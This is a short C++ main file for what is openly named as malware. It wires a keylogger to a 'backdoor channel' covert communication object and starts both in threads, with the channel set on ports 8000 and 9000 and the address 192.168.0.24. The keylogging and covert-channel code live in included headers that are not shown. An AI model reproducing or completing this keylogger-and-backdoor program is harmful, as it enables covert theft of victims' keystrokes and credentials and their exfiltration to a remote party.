
#include "covert_channel/backdoor_channel.h"
#include "keylogger/keylogger.h"
#include <thread>

int main(){

    Backdoor_Channel ch;
    Key_Logger kl(ch);
    
    
    std::thread bd_thread(&Backdoor_Channel::start, &ch, "lo", 8000, 9000, "192.168.0.24");
    std::thread kl_thread(&Key_Logger::start, &kl);

    bd_thread.join();
    kl_thread.join();

}
